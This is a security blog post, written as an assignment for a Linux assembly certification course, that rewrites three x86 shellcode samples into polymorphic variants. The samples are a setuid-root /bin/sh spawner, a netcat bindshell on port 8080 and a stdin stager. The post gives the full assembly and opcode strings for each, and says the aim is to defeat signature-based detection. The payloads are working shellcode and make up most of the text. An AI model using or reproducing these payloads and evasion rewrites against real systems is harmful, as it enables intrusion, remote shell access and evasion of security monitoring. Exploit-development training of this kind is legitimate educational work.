---
layout: single
title: Creating Polymorphic Shellcode
date: 2018-09-21
categories:
  - security
  - shellcoding
tags:
  - securitytube
  - slae
---

Assignment 6 of the [SecurityTube Linux Assembly Expert Certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/) consists of taking three shellcode samples from [shell-storm.org](http://shell-storm.org/) and creating polymorphic examples that are no larger than 150% the original size.

The goal of this task is to mimic the same original functionality, but to beat pattern matching techniques that could be used to fingerprint the payload.

Below are the three samples that I chose to use and the polymorphic version of each that I created.

Sample 1: setresuid(0,0,0)-/bin/sh
----------------------------------
* **Original length:** 35 bytes
* **Polymorphic length:** 51 bytes (45% increase)
* **Source:** [http://shell-storm.org/shellcode/files/shellcode-216.php](http://shell-storm.org/shellcode/files/shellcode-216.php)

**Original code:**
```nasm
;setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80

;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
```

```
\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80
```

**Polymorphic code:**
```nasm
global _start

section .text
  _start:
    ; setresuid(0,0,0)
    lea     eax, [0xab32a1a5]
    sub     eax, 0xab32a101
    cdq
    mov     ebx, edx
    mov     ecx, ebx
    int     0x80

    ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
    push    ebx
    xor     eax, eax
    mov     al, 0xb
    mov     edi, 0xd34db3ef
    mov     ebx, 0xbb3e9cc0
    xor     ebx, edi
    push    ebx
    mov     ebx, 0xbd24d1c0
    xor     ebx, edi
    push    ebx
    push    edx
    lea     ebx, [esp + 4]
    int     0x80
```

```
\x8d\x05\xa5\xa1\x32\xab\x2d\x01\xa1\x32\xab\x99\x89\xd3\x89\xd9\xcd\x80\x53\x31\xc0\xb0\x0b\xbf\xef\xb3\x4d\xd3\xbb\xc0\x9c\x3e\xbb\x31\xfb\x53\xbb\xc0\xd1\x24\xbd\x31\xfb\x53\x52\x8d\x5c\x24\x04\xcd\x80
```

Sample 2: netcat bindshell port 8080
------------------------------------
* **Original length:** 75 bytes
* **Polymorphic length:** 85 bytes (13% increase)
* **Source:** [http://shell-storm.org/shellcode/files/shellcode-684.php](http://shell-storm.org/shellcode/files/shellcode-684.php)

**Original code:**
```
00000000  EB2A              jmp short 0x2c
00000002  5E                pop esi
00000003  31C0              xor eax,eax
00000005  884607            mov [esi+0x7],al
00000008  88460F            mov [esi+0xf],al
0000000B  884619            mov [esi+0x19],al
0000000E  89761A            mov [esi+0x1a],esi
00000011  8D5E08            lea ebx,[esi+0x8]
00000014  895E1E            mov [esi+0x1e],ebx
00000017  8D5E10            lea ebx,[esi+0x10]
0000001A  895E22            mov [esi+0x22],ebx
0000001D  894626            mov [esi+0x26],eax
00000020  B00B              mov al,0xb
00000022  89F3              mov ebx,esi
00000024  8D4E1A            lea ecx,[esi+0x1a]
00000027  8D5626            lea edx,[esi+0x26]
0000002A  CD80              int 0x80
0000002C  E8D1FFFFFF        call 0x2
00000031  2F                das
00000032  62696E            bound ebp,[ecx+0x6e]
00000035  2F                das
00000036  6E                outsb
00000037  6323              arpl [ebx],sp
00000039  2D6C703830        sub eax,0x3038706c
0000003E  3830              cmp [eax],dh
00000040  232D652F6269      and ebp,[dword 0x69622f65]
00000046  6E                outsb
00000047  2F                das
00000048  7368              jnc 0xb2
0000004A  23                db 0x23
```

```
\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x70\x38\x30\x38\x30\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x23
```

**Polymorphic code:**
```nasm
global _start

section .text
  _start:
    mov   edi, 0x01010101
    mov   ecx, edi
    xor   ecx, edi

    push  0x01010169
    push  0x722e6f68
    push  0x632e642c
    push  0x01303931
    push  0x39716d2c
    push  0x01626f2e
    push  0x6f68632e
    push  edi

    mov   cl, 0x8
    mov   bl, 0x4

  decode:
    mov   eax, ecx
    sub   eax, 0x1
    mul   ebx
    xor   [esp + eax], edi
    loop  decode

    mov   al, 0xc
    sub   al, 0x1
    lea   ebx, [esp + 0x4]
    lea   edx, [ebx + 0x8]
    push  edx
    lea   edx, [ebx + 0x10]
    push  edx
    push  ebx
    lea   ecx, [esp]
    xor   edx, edx
    int   0x80
```

```
\xbf\x01\x01\x01\x01\x89\xf9\x31\xf9\x68\x69\x01\x01\x01\x68\x68\x6f\x2e\x72\x68\x2c\x64\x2e\x63\x68\x31\x39\x30\x01\x68\x2c\x6d\x71\x39\x68\x2e\x6f\x62\x01\x68\x2e\x63\x68\x6f\x57\xb1\x08\xb3\x04\x89\xc8\x83\xe8\x01\xf7\xe3\x31\x3c\x04\xe2\xf4\xb0\x0c\x2c\x01\x8d\x5c\x24\x04\x8d\x53\x08\x52\x8d\x53\x10\x52\x53\x8d\x0c\x24\x31\xd2\xcd\x80
```

Sample 3: stager that reads second stage shellcode (127 bytes maximum) from stdin
----------------------------------------------------------------------------------
* **Original length:** 14 bytes
* **Polymorphic length:** 18 bytes (28% increase)
* **Source:** [http://shell-storm.org/shellcode/files/shellcode-824.php](http://shell-storm.org/shellcode/files/shellcode-824.php)

**Original code:**
```c
/*
 * (linux/x86) stagger that reads second stage shellcode (127 bytes maximum) from stdin - 14 bytes
 * _fkz / twitter: @_fkz
 *
 * sc = "\x6A\x7F\x5A\x54\x59\x31\xDB\x6A\x03\x58\xCD\x80\x51\xC3"
 *
 * Example of use:
 * (echo -ne "\xseconde stage shellcode\x"; cat) | ./stager
 */

 char shellcode[] =

 		"\x6A\x7F"		//	push	byte	+0x7F
 		"\x5A"			//	pop		edx
 		"\x54"			//	push	esp
 		"\x59"			//	pop		esp
 		"\x31\xDB"		//	xor		ebx,ebx
 		"\x6A\x03"		//	push	byte	+0x3
 		"\x58"			//	pop		eax
 		"\xCD\x80"		//	int		0x80
 		"\x51"			//	push	ecx
 		"\xC3";			//	ret

int main(int argc, char *argv[])
{
	void (*execsh)() = (void *)&shellcode;
	execsh();
	return 0;
}
```

**Polymorphic code:**
```nasm
global _start

section .text
  _start:
    lea   ecx, [esp]
    xor   eax, eax
    cdq
    mov   ebx, edx
    mov   eax, ebx
    mov   al, 0x3
    mov   dl, 0x7f
    int   0x80
    call  ecx
```

```
\x8d\x0c\x24\x31\xc0\x99\x89\xd3\x89\xd8\xb0\x03\xb2\x7f\xcd\x80\xff\xd1
```

<hr />

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

Student ID: SLAE-1340

All source files can be found on GitHub at [https://github.com/rastating/slae](https://github.com/rastating/slae)
